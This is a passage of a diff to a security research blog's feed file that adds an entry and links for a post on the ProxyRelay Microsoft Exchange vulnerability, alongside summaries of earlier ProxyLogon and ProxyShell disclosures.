+  &lt;li&gt;&lt;strong&gt;Aug 18, 2022&lt;/strong&gt; - Microsoft released the CVE and &lt;a href=&quot;https://techcommunity.microsoft.com/t5/exchange-team-blog/released-august-2022-exchange-server-security-updates/ba-p/3593862&quot;&gt;the patch activation documentation&lt;/a&gt;!&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+                <link>https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/</link>
+                <guid>https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay</guid>
+                <pubDate>Wed, 19 Oct 2022 00:00:00 +0800</pubDate>
+        </item>
 
         <item>
                 <title>DEVCORE 徵求資安研究員</title>
@@ -1547,7 +1745,7 @@ Next, we need to forge the structure &lt;code class=&quot;highlighter-rouge&quot
   &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;A New Attack Surface on MS Exchange Part 4 (coming soon…)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;With ProxyShell, an unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through an exposed 443 port! Here is the &lt;a href=&quot;https://youtu.be/FC6iHw258RI&quot;&gt;demonstration video&lt;/a&gt;:&lt;/p&gt;
@@ -1713,7 +1911,7 @@ Next, we need to forge the structure &lt;code class=&quot;highlighter-rouge&quot
   &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;A New Attack Surface on MS Exchange Part 4 (coming soon…)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 </description>
@@ -1964,7 +2162,7 @@ Next, we need to forge the structure &lt;code class=&quot;highlighter-rouge&quot
   &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;A New Attack Surface on MS Exchange Part 4 (coming soon…)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Microsoft Exchange, as one of the most common email solutions in the world, has become part of the daily operation and security connection for governments and enterprises. This January, we reported a series of vulnerabilities of Exchange Server to Microsoft and named it as &lt;a href=&quot;https://proxylogon.com/&quot;&gt;ProxyLogon&lt;/a&gt;. ProxyLogon might be the most severe and impactful vulnerability in the Exchange history ever. If you were paying attention to the industry news, you must have heard it.&lt;/p&gt;
